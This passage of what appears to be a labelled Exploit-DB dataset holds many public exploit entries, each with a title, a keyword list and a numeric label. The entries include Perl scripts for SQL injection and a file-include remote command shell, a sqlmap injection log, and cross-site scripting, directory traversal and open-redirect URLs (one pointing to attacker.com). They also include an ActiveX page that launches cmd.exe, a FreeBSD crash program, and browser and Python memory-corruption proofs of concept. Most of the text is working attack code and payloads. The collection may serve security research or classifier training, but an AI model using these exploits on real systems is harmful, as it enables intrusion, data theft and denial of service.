/phone/config/WebItemsLevel.cfg user user # e.g. perl $0 https://target:port/ /phone/config/.htpasswd user user ""; exit; }  my $user_agent = rand_ua(""browsers""); my $browser  = LWP::UserAgent->new(                                         protocols_allowed => ['http', 'https'],                                         ssl_opts => { verify_hostname => 0 }                                 );    $browser->timeout(10);    $browser->agent($user_agent); my $payload = $host.""/cgi-bin/cgiServer.exx?command=dumpConfigFile(\""$file\"")""; my $request = HTTP::Request->new (GET => $payload,[ Content_Type => ""application/x-www-form-urlencoded""], "" ""); $request->authorization_basic($user, $pass); print ""# ========================================================================================================\n""; my $response = $browser->request($request); say ""# >  $_ => "", $request->header($_) for  $request->header_field_names; say ""# <  $_ => "", $response->header($_) for  $response->header_field_names; print ""# 401 Unauthorized! Wrong Username or Password!\n"" and exit if ($response->code eq '401'); print ""# ========================================================================================================\n"";  if ($response->content =~ m/$file/g){          my $content = $response->content;         $content =~ s/$file//g;         $content =~ s/^\n+//;         print $content;         print ""\n# ========================================================================================================\n"";         exit;  } else {          print ""# Exploit failed or full path is wrong..\n"";         exit;          }","[""'"", ""dumpConfigFile'"", 'PreAuth']",1
48475,"WordPress Plugin Ajax Load More 5.3.1 - '#1' Authenticated SQL Injection # Exploit Title: Wordpress Plugin Ajax Load More 5.3.1 - '#1' Authenticated SQL Injection # Exploit Author: SunCSR (Sun* Cyber Security Research) - Nguyen Khang # Google Dork: N/A # Date: 2020-05-18 # Vendor Homepage: https://connekthq.com/plugins/ajax-load-more/ # Software Link: https://vi.wordpress.org/plugins/ajax-load-more/ # Version: <= 5.3.1 # Tested on: Ubuntu 18.04  Description: A blind SQL injection vulnerability is present in Ajax load more. $wpdb->get_var(""SELECT repeaterDefault FROM "" . $table_name . "" WHERE name = '$n'"");  POC:  POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1 Host: lab-pwn.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://lab-pwn.com/wordpress/wp-admin/admin.php?page=ajax-load-more-repeaters Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 597 Origin: http://lab-pwn.com Connection: close Cookie: wordpress_ce916d86f593e303743adeb31ce28da7=admin%7C1589950799%7CCMYSDjadMRtkKIav5orz6knKlOvE7Bz8d67ACwFl5fl%7Cab29a771b72eed2d65f02d50fd24ea85ae85f38d0fcc41abb56797fb8c7590a3; wordpress_logged_in_ce916d86f593e303743adeb31ce28da7=admin%7C1589950799%7CCMYSDjadMRtkKIav5orz6knKlOvE7Bz8d67ACwFl5fl%7Cb14c3363c0174d9eb93e2d2bbdd3627b293ea3e8fa8a1080325f62bb462938e2; wp-settings-time-1=1589773793; PHPSESSID=0lsvlo9il6ibjiuflljl3qcub1  action=alm_update_repeater&value=%3Cli+%3C%3Fphp+if+(!has_post_thumbnail())+%7B+%3F%3E+class%3D%22no-img%22%3C%3Fphp+%7D+%3F%3E%3E%0A+++%3C%3Fphp+if+(+has_post_thumbnail()+)+%7B+the_post_thumbnail('alm-thumbnail')%3B+%7D%3F%3E%0A+++%3Ch3%3E%3Ca+href%3D%22%3C%3Fphp+the_permalink()%3B+%3F%3E%22+title%3D%22%3C%3Fphp+the_title()%3B+%3F%3E%22%3E%3C%3Fphp+the_title()%3B+%3F%3E%3C%2Fa%3E%3C%2Fh3%3E%0A+++%3Cp+class%3D%22entry-meta%22%3E%3C%3Fphp+the_time(%22F+d%2C+Y%22)%3B+%3F%3E%3C%2Fp%3E%0A+++%3C%3Fphp+the_excerpt()%3B+%3F%3E%0A%3C%2Fli%3E&repeater=' or sleep(5)#&type=test&alias=&nonce=ae68ab8c91  SQL map: custom injection marker ('*') found in option '--data'. Do you want to process it? [Y/n/q] [12:43:16] [INFO] resuming back-end DBMS 'mysql' [12:43:16] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: #1* ((custom) POST)     Type: boolean-based blind     Title: OR boolean-based blind - WHERE or HAVING clause     Payload: action=alm_update_repeater&value=<li <?php if (!has_post_thumbnail()) { ?> class=""no-img""<?php } ?>>    <?php if ( has_post_thumbnail() ) { the_post_thumbnail('alm-thumbnail'); }?>    <h3><a href=""<?php the_permalink(); ?>"" title=""<?php the_title(); ?>""><?php the_title(); ?></a></h3>    <p class=""entry-meta""><?php the_time(""F d, Y""); ?></p>    <?php the_excerpt(); ?> </li>&repeater=-2104' OR 5557=5557-- dHBa#&type=test&alias=&nonce=ae68ab8c91      Type: error-based     Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)     Payload: action=alm_update_repeater&value=<li <?php if (!has_post_thumbnail()) { ?> class=""no-img""<?php } ?>>    <?php if ( has_post_thumbnail() ) { the_post_thumbnail('alm-thumbnail'); }?>    <h3><a href=""<?php the_permalink(); ?>"" title=""<?php the_title(); ?>""><?php the_title(); ?></a></h3>    <p class=""entry-meta""><?php the_time(""F d, Y""); ?></p>    <?php the_excerpt(); ?> </li>&repeater=' OR (SELECT 3214 FROM(SELECT COUNT(*),CONCAT(0x716a6b7a71,(SELECT (ELT(3214=3214,1))),0x716a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AHqK#&type=test&alias=&nonce=ae68ab8c91      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 OR time-based blind     Payload: action=alm_update_repeater&value=<li <?php if (!has_post_thumbnail()) { ?> class=""no-img""<?php } ?>>    <?php if ( has_post_thumbnail() ) { the_post_thumbnail('alm-thumbnail'); }?>    <h3><a href=""<?php the_permalink(); ?>"" title=""<?php the_title(); ?>""><?php the_title(); ?></a></h3>    <p class=""entry-meta""><?php the_time(""F d, Y""); ?></p>    <?php the_excerpt(); ?> </li>&repeater=' OR SLEEP(5)-- pExJ#&type=test&alias=&nonce=ae68ab8c91 --- [12:43:17] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Nginx back-end DBMS: MySQL >= 5.0","[""'#1'""]",1
12656,"Battle Scrypt - Arbitrary File Upload  # Exploit Title: Battle Scrypt Shell Upload Vulnerability  # Date: 19.05.2010  # Author: DigitALL  # Software Link: http://www.scrypted.com/battlescrypt.html  # Tested on: Windows Xp Sp3  # Code :  d0rk: ""Powered by Battle Scrypt"" or inurl:upload.php For Script Kidde :)  Exploit: Go To /upload.php Your Shell shell.php.jpg And Shell Upload.And Display* stats.php?id=[id]*  Your Shell Link : /images/uploads/[id].php  Gr33tz Thanks: Efe KroNicKq NoFearx38 and All 1923Turk.Com Members  Site's: // www.digitallsecurity.org // digit4ll.blogspot.com // www.hacker-zone.org // www.katliam.org // www.sirperdesi.org // www.kankardes.com //",['upload.php '],1
30949,"OpenBiblio 0.x - 'theme_del_confirm.php?name' Cross-Site Scripting source: https://www.securityfocus.com/bid/27053/info   OpenBiblio is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data. The issues include SQL-injection, cross-site scripting, HTML-injection, and local file-include vulnerabilities.   Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, execute arbitrary local scripts, retrieve potentially sensitive information, or exploit latent vulnerabilities in the underlying database.   These issues affect Openbiblio 0.5.2-pre4 and prior versions.   http://www.example.com/openbiblio/admin/theme_del_confirm.php?themeid=6&amp;name=[XSS]","[""'theme_del_confirm.php?name'""]",1
26390,"saPHP Lesson - 'add.php?forumid' SQL Injection source: https://www.securityfocus.com/bid/15185/info  saphp Lesson is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/dros/add.php?forumid=|almaster","[""'add.php?forumid'""]",1
21890,"Omnistar Document Manager 8.0 - Multiple Vulnerabilities Title: ====== Omnistar Document Manager v8.0 - Multiple Vulnerabilities   Date: ===== 2012-10-03   References: =========== http://www.vulnerability-lab.com/get_content.php?id=712   VL-ID: ===== 712   Common Vulnerability Scoring System: ==================================== 8.3   Introduction: ============= You can easily manage all of your documents with Omnistar Document Management Software. Perform multiple uploads  of large files and deliver them without using attachments. Never worry about which employees have and don t have  accounts with unlimited users. Setup user groups to manage thousands of users and set own permissions.  (Copy of the Vendor Homepage: http://www.omnistardrive.com/ )   Abstract: ========= The Vulnerability Laboratory Research Team discovered multiple critical Web Vulnerabilities in Omnistardrives Omnistar Document Manager v8.0.   Report-Timeline: ================ 2012-10-03:	Public or Non-Public Disclosure   Status: ======== Published   Affected Products: ================== Omnistar Interactive Product: Document Manager v8.0   Exploitation-Technique: ======================= Remote   Severity: ========= Critical   Details: ======== 1.1 Multiple SQL Injection Vulnerabilities are detected in Omnistardrives Omnistar Document Manager v8.0 web application. The sql injection vulnerability allows an remote attacker to inject own sql commands/statements on the affected application dbms. The vulnerabilities are detected in the user portal and admin section of the application. The sql vulnerabilities can be exploitation  by remote attackers without privileged application user or admin account. The sql bugs are located index.php file with the bound  vulnerable report_id, delete_id, add_id, return_to, interface, page & sort_order parameter requests. Successful exploitation of the  vulnerabilities results in application dbms compromise & dbms manipulation via sql injection.  Vulnerable Section(s): 			[+] /user 			[+] /admin  Vulnerable Module(s): 			[+] index.php  Vulnerable Parameter(s): 			[+] report&id= 			[+] sort_order 			[+] delete&id= 			[+] page= 			[+] interface=   1.2 A local file include vulnerability is detected in Omnistardrives Omnistar Document Manager v8.0 web application. The vulnerability allows a local privileged user account to include and load local system files. The vulnerability  is located in the index module with the bound vulnerable area parameter request. Successful exploitation of the  vulnerability results in a web server compromise via file load or information disclosure via local system file include.   Vulnerable Section(s): 			[+] /user 			[+] /admin  Vulnerable Module(s): 			[+] index.php 			[+] class.inc.php  Vulnerable Parameter(s): 			[+] area=    1.3 Multiple non persistent cross site scripting vulnerabilities are detected in Omnistardrives Omnistar Document Manager v8.0 web application. The vulnerabilities allow remote attackers to hijack administrator/moderator/customer sessions via persistent malicious script code inject  on application side. The vulnerabilities are located in the interface exception-handling module of the application with the client side  bound vulnerable interface, act, name & alert_msg parameter requests.   Vulnerable Section(s): 			[+] /user 			[+] /admin  Vulnerable Module(s): 			[+] index.php  Vulnerable Parameter(s): 			[+] interface 			[+] act 			[+] name 			[+] alert_msg   Proof of Concept: ================= 1.1 The sql injection vulnerabilities can be exploited by remote attackers without required user inter action and without privileged application  user account. For demonstration or reproduce ...  https://127.0.0.1:1338/[PATH]/index.php ?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=report&id=-1' union all select 1,2,3,4,()database,6--  https:/127.0.0.1:1338/[PATH]/index.php ?area=main&interface=users&sort_by=1&sort_order=ASC&page=-1%27&return_to=@list&act=list&sort_by=first_name&sort_order=-1' union all select 1,2,3,4,()database,6--  https://127.0.0.1:1338/[PATH]/index.php ?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=delete&id=-1' union all select 1,2,3,4,()database,6--  https://127.0.0.1:1338/[PATH]/index.php ?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=delete&id=-1' union all select 1,2,3,4,()database,6--  https://127.0.0.1:1338/[PATH]/index.php ?interface=-1' union all select 1,2,3,4,()database,6--&alert_msg=1337  https://127.0.0.1:1338/[PATH]/index.php ?area=main&interface=recycle_bin&act=list&sort_by=1&sort_order=ASC&page=-1' union all select 1,2,3,4,()database,6-- &return_to=-1' union all select 1,2,3,4,()database,6--   #!/usr/bin/perl  use IO::Socket; if(@ARGV < 1){ print "" =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-  >  Remote SQL-Injection Exploit - Omnistar Document Manager v8.0 >  --- >  $file ... can also be exchanged with the following parameters --- >  $file2 = ""/[INCLUDE PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=delete&id=""; >  $file3 = ""/[INCLUDE PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&page=-1%27&return_to=@list&act=list&sort_by=first_name&sort_order=""; >  $file4 = ""/[INCLUDE PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=report&id=""; >  $file5 = ""/[INCLUDE PATH]/index.php?area=main&interface=recycle_bin&act=list&sort_by=1&sort_order=ASC&page=""; >  ---  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ""; exit(); } $server = $ARGV[0]; $server =~ s/(http:\/\/)//eg; $host = ""http://"".$server; $port = ""80""; $file = ""/[INCLUDE PATH]/index.php?interface="";  print ""Script <DIR> : ""; $dir = <STDIN>; chop ($dir);  if ($dir =~ /exit/){ print ""[+] Exploit Failed\n""; exit(); }  if ($dir =~ /\//){} else { print ""[+] Exploit Failed\n""; exit();  }  print ""User <ID>    : ""; $ID = <STDIN>; chop ($ID);  if ($ID =~ /exit/){ print ""[+] Exploit Failed\n""; exit(); }  $len=length($ID);  if ($len == 1){} else { print ""[+] Exploit Failed\n""; exit();  }  $target = ""-1+union+all+select+1,2,3,4,concat(X,0x3a,X,0x3a,X),6,7,+from+user+limit+1,1/*"".$ID; $target = $host.$dir.$file.$target;  print ""[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n""; print ""[+] Verbinden zu ... [> : $server\n""; $socket = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""$port"") || die ""[+] Verbindungsaufbau fehlgeschlagen...!\n""; print $socket ""GET $target HTTP/1.1\n""; print $socket ""Host: $server\n""; print $socket ""Accept: */*\n""; print $socket ""Connection: close\n\n""; print ""[+] Connected!...\n""; while($answer = <$socket>) { if ($answer =~ /color=\""#FF0000\"">(.*?)<\/font>/){ print ""[+] Exploiting the System! Grab Admin-HASH\n""; print ""[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n""; print ""[+] Clear Username: $1\n""; }  if ($answer =~ /Syntax error/) {  print ""+ Exploit Failed : ( \n""; print ""[+] SYNTAX ERROR! Request: bkm@vulnerability-lab.com""; exit();  }  if ($answer =~ /Internal Server Error/) { print ""+ Exploit Failed : (  \n""; print ""[+] INTERNEL ERROR! Check out your Ressources""; exit();  } break; } close($sock);   1.2 The local file include vulnerability can be exploited by local low privileged user account without required user inter action. For demonstration or reproduce ...  https://127.0.0.1:1338/[PATH]/index.php?area=../../[LOCAL FILE INCLUDE VULNERABILITY!]/&.. https://127.0.0.1:1338/[PATH]/index.php?area=http://[LOCAL FILE INCLUDE VULNERABILITY!]&..  #!/usr/bin/perl  use LWP::UserAgent;  $Path = $ARGV[0]; $Pathtocmd = $ARGV[1]; $cmdv = $ARGV[2];  if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}  head();  while() {    	print ""[shell] \$""; while(<STDIN>)    	{    $cmd=$_;    chomp($cmd);  $xpl = LWP::UserAgent->new() or die; $req = HTTP::Request->new(GET =>$Path.'[INCLUDE PATH HERE!]/index.php?area='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die ""\nCould Not connect\n"";  $res = $xpl->request($req); $return = $res->content; $return =~ tr/[\n]/[....]/;  if (!$cmd) {print ""\nBitte geben sie ein Kommando ein\n\n""; $return ="""";}  elsif ($return =~/Stream �ffnen fehlgeschlagen: HTTP Request fehlgeschlagen/ || $return =~/: Kommando Zeile Angeben! <b>/)    	{print ""\nKann keine Verbindung zum CMD HOST aufbauen oder Ung�ltige Kommando Variable\n"";exit} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print ""\nUng�ltiges Kommando oder Kein Eingabe\n\n""}  if($return =~ /(.*)/)  {    	$finreturn = $1;    	$finreturn=~ tr/[....]/[\n]/;    	print ""\r\n$finreturn\n\r"";    	last; }  else {print ""[shell] \$"";}}}last;  sub head()  {  print ""\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"";  print "" >> Local File Include Vulnerability - Omnistar Document Manager v8.0 (?area=) \r\n"";  print ""=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"";  } sub usage()  {  head();  print "" Usage: exploitname.pl [TARGET] [CMD SHELL location] [CMD SHELL Variable]\r \n\n"";  print "" <Seite> [Full Path]  [http://www.webseite.com/] 			    \r\n"";  print "" <CMD SHELL> <Path to CMD Shell> <http://www.seite.com/cmdfile.txt> 	    \r\n"";  print "" <CMD VARIABLE> - Command variable - PHP SHELL 				    \r\n"";  print ""============================================================================\r\n"";  print ""                       	by ~BKM AKA Rem0ve  				    \r\n"";  print ""                       	www.vulnerability-lab.com 			    \r\n"";  print ""============================================================================\r\n"";  exit();  }   1.3 The client side cross site scripting vulnerabilities can be exploited by remote attackers without required application user account and with  low or medium user inter action by an administrator/moderator/customer. For demonstration or reproduce ...  <html> <head><body> <title>Omnistar Document Manager v8.x - Client Side Cross Site Scripting PoC</title> <iframe src=https://127.0.0.1:1338/[PATH]/index.php?interface=folder_groups-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E> <iframe src=https://127.0.0.1:1338/[PATH]/index.php?area=main&interface=backup_restore-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E> <iframe src=https://127.0.0.1:1338/[PATH]/index.php?interface=custom&act=user_fields-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E> <iframe src=https://127.0.0.1:1338/[PATH]/index.php?area=main&interface=anonymous_review&act=anonymous_root-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E> <iframe src=https://127.0.0.1:1338/[PATH]/index.php?interface=[SQL]&alert_msg=-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E> <iframe src=https://127.0.0.1:1338/[PATH]/index.php?area=main&interface=documents&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=x&category=-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E> </body></head> </html>   Risk: ===== 1.1 The security risk of the remote sql injection vulnerabilities are estimated as critical.  1.2 The security risk of the local file include vulnerability is etimated as high(-).  1.3 The security risk of the client side cross site scripting vulnerabilities are estimated as low(+)|(-)medium.   Credits: ======== Vulnerability Laboratory [Research Team]  -    Benjamin Kunz Mejri (bkm@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2012 | Vulnerability Laboratory  --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",['index.php '],1
31664,EsContacts 1.0 - 'login.php?msg' Cross-Site Scripting source: https://www.securityfocus.com/bid/28825/info      EsContacts is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.      Attackers may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow attackers to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/EScontacts_path/EsContacts/login.php?msg=[XSS],"[""'login.php?msg'""]",1
25868,"DUware DUforum 3.0/3.1 - 'messages.asp?iMsg' SQL Injection source: https://www.securityfocus.com/bid/14035/info  DUforum is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.   http://www.example.com/DUforum/messages.asp?iMsg=[SQL Inject]248&iFor=6","[""'messages.asp?iMsg'""]",1
30593,"Microsoft MFC Library - CFileFind::FindFile Buffer Overflow source: https://www.securityfocus.com/bid/25697/info  The CFileFind::FindFile method in the MFC library for Microsoft Windows is prone to a buffer-overflow vulnerability because the method fails to perform adequate boundary checks of user-supplied input.  Successfully exploiting this issue may allow attackers to execute arbitrary code in the context of applications that use the vulnerable method.  The MFC library included with Microsoft Windows XP SP2 is affected; other versions may also be affected.  This issue also occurs in the 'hpqutil.dll' ActiveX control identified by CLSID: F3F381A3-4795-41FF-8190-7AA2A8102F85.   <object classid='clsid:F3F381A3-4795-41FF-8190-7AA2A8102F85' id='pAF'> </object> <input type=""button"" value=""heap"" language=""VBScript"" OnClick=""OuCh()""> <script language=""VBScript""> sub OuCh() Var_0 = String(620, ""A"") pAF.ListFiles Var_0 End Sub </script>","['CFileFind::FindFile', ""'hpqutil.dll'""]",1
27235,SAP Business Connector 4.6/4.7 - 'adapter-index.dsp?url' Arbitrary Site Redirect source: https://www.securityfocus.com/bid/16671/info  SAP Business Connector is susceptible to an input-validation vulnerability. This issue is due to the application's failure to properly sanitize user-supplied input.  This issue allows remote attackers to execute phishing-style attacks against targeted SAP Business Connector administrators.  The following URI example demonstrates this issue:  http://www.example.com/WmRoot/adapter-index.dsp?url=http://www.attacker.com/,"[""'adapter-index.dsp?url'""]",1
2541,"FreeBSD 6.1-RELEASE-p10 - 'ftruncate' Local Denial of Service /* FreeBSD cvs commit: src/sys/ufs/ufs/ufs_vnops.c maxim 2006-05-31 13:15:29 UTC    Log: According to POSIX, the result of ftruncate(2) is unspecified    for file types other than VREG, VDIR and shared memory objects.    We already handle VREG, VLNK and VDIR cases.  Silently ignore    truncate requests for all the rest. PR kern/98064     lol lol, thatz true. kokanin@gmail lolling it out in '06 !""#%&%(20061013)(=""#""!    tested on FreeBSD 6.0-RELEASE-p5, 6.1-RELEASE-p10 (latest at the time of writing)    - it just makes the system reboot, and with a bit of luck fucks up the filesystem.    wow, that sort of makes this 0day local freebsd denial of service for non-CURRENT or whatever.    usage: ./run me and wait a moment.. woo, it's friday the 13th, go crash some shell providers.     */  #include <fcntl.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h>  int main(){ mkfifo(""lol"",0x1b6); int fd = open(""lol"",O_RDWR);  ftruncate(fd,12345); close(fd); }  // milw0rm.com [2006-10-13]","[""'ftruncate'""]",1
24425,"phpWebSite 0.7.3/0.8.x/0.9.x Comment Module - 'CM_pid' Cross-Site Scripting source: https://www.securityfocus.com/bid/11088/info  It is reported that phpWebSite is susceptible to multiple cross-site scripting, HTML injection and SQL injection vulnerabilities.  The cross-site scripting issue is present in a parameter of the comments module script. An attacker can exploit these issues by creating a malicious link to the vulnerable module containing HTML and script code and send this link to a vulnerable user. When the user follows the link, the attacker-supplied code renders in the user's browser.  An SQL injection issue exists in the application as well. This issue affects a parameter of the calendar module script. This issue may be exploited to cause sensitive information to be disclosed to a remote attacker.  Finally, a HTML Injection vulnerability is reported to affect the application. The problem is said to occur in the notes module due to a lack of sufficient sanitization performed on user supplied data.  Attackers may potentially exploit this issue to manipulate web content, take unauthorized site actions in the context of the victim, or to steal cookie-based authentication credentials.  These vulnerabilities were reported in phpWebsite 0.9.3-4, previous versions are also reported to be vulnerable.  /index.php?module=comments&CM_op=replyToComment&CM_pid=1[XSS]","[""'CM_pid'""]",1
4050,"Zenturi ProgramChecker - 'ActiveX NavigateUrl()' Insecure Method <pre> <code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">-----------------------------------------------------------------------------  <b>Zenturi ProgramChecker ActiveX Control ""NavigateUrl()"" Insecure Method</b>    url: http://www.programchecker.com/activeintro.aspx   author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org    Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7   I can't believe my eyes when I see what you can do with this ActiveX  (and I can't believe that this product is considered as antispyware).  You can use the ""NavigateUrl()"" to arbitrary launch local file from a pc.  Try, for example, to launch ""c:\somefile.exe"" and see what happen.  Imagine to use this method with the ""DownloadFile()"" one, you can download  something on the pc and run it without problems.  For the ""DownloadFile()"" vulnerability see:  <a href=http://www.milw0rm.com/exploits/4008>http://www.milw0rm.com/exploits/4008</a> -----------------------------------------------------------------------------  <object classid='clsid:59DBDDA6-9A80-42A4-B824-9BC50CC172F5' id='test' ></object>  <input language=VBScript onclick=tryMe() type=button value=""Click here to start the test"">  <script language='vbscript'> Sub tryMe()    test.NavigateUrl ""notepad.exe"" ,""shinnai"" ,""_SELF""  test.NavigateUrl ""cmd.exe"" ,""shinnai"" ,""_SELF""  End Sub </script> </span></span> </code></pre>  # milw0rm.com [2007-06-08]","[""'ActiveX NavigateUrl()'"", 'ActiveX']",1
26080,Comdev eCommerce 3.0 - 'WCE.download.php' Directory Traversal source: https://www.securityfocus.com/bid/14479/info  Comdev eCommerce is prone to a directory traversal vulnerability.  A remote unauthorized user can disclose the contents of arbitrary local files through the use of directory traversal strings '../' relative to the Web application's root path. Exploitation of this vulnerability could lead to a loss of confidentiality.  http://www.vulnerable.com/oneadmin/faqsupport/wce.download.php?download=../../config.php,"[""'WCE.download.php'""]",1
25403,phpBB Photo Album 2.0.53 Module - 'Album_Cat.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/13157/info  Photo Album is affected by a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/album_cat.php?cat_id=5&amp%3bsid='%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,"[""'Album_Cat.php'""]",1
43183,"Microsoft Edge Chakra JIT - 'GlobOpt::OptTagChecks' Must Consider IsLoopPrePass Properly /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1365  Some background: https://bugs.chromium.org/p/project-zero/issues/detail?id=1364  There's one more place that emits a BailOnNotObject opcode.  Here's a snippet of GlobOpt::OptTagChecks.     if (valueType.CanBeTaggedValue() &&         !valueType.HasBeenNumber() &&         (this->IsLoopPrePass() || !this->currentBlock->loop))     {         ValueType newValueType = valueType.SetCanBeTaggedValue(false);          // Split out the tag check as a separate instruction.         IR::Instr *bailOutInstr;         bailOutInstr = IR::BailOutInstr::New(Js::OpCode::BailOnNotObject, IR::BailOutOnTaggedValue, instr, instr->m_func);         ...     }  The JIT compiler analyzes a loop twice for some reasons such as to track types properly. In the first analysis, ""IsLoopPrePass"" returns true. And it returns false in the second analysis.  But in the above snippet, it emits the bailout opcode in the first analysis(""this->IsLoopPrePass()"" is satisfied). But the return value of ""valueType.HasBeenNumber()"" can be different in the second analysis. So it may fail to detect type changes.  PoC: */  function opt() {     let obj = [2.3023e-320];     for (let i = 0; i < 1; i++) {         obj.x = 1;  // In the first analysis, BailOnNotObject emitted         obj = +obj;  // Change the type         obj.x = 1;  // Type confusion     } }  function main() {     for (let i = 0; i < 1000; i++) {         opt();     } }  main();","[""'GlobOpt::OptTagChecks'"", 'JIT']",1
38618,"Python 3.3 < 3.5 - 'product_setstate()' Out-of-Bounds Read Title: Python 3.3 - 3.5 product_setstate() Out-of-bounds Read Credit: John Leitch (john@autosectools.com), Bryce Darling (darlingbryce@gmail.com) Url1: http://autosectools.com/Page/Python-product_setstate-Out-of-bounds-Read Url2: http://bugs.python.org/issue25021 Resolution: Fixed  Python 3.3 - 3.5 suffer from a vulnerability caused by the behavior of the product_setstate() function. When called, the function loops over the state tuple provided and clamps each given index to a value within a range from 0 up to the max number of pools. Then, it loops over the pools and gets an item from the pool using the previously clamped index value.  However, for the upper bound, the clamping logic is using the number of pools and not the size of the individual pool, which can result in a call to PyTuple_GET_ITEM that uses an index outside of the bounds of the pool:      for (i=0; i n-1)             index = n-1;         lz->indices[i] = index;     }      result = PyTuple_New(n);     if (!result)         return NULL;     for (i=0; ipools, i);         PyObject *element = PyTuple_GET_ITEM(pool, lz->indices[i]);         Py_INCREF(element);         PyTuple_SET_ITEM(result, i, element);     }      The invalid result of the PyTyple_GET_ITEM() expression is then passed to Py_INCREF(), which performs a write operation that corrupts memory.  In some applications, it may be possible to exploit this behavior to corrupt sensitive information, crash, or achieve code execution. The out-of-bounds write can be observed by running the following script:  import itertools  p = itertools.product((0,),(0,)) p.__setstate__((0, 1))  Which, depending on the arrangement of memory, may produce an exception such as this:  0:000> g (ea4.11a4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0000c962 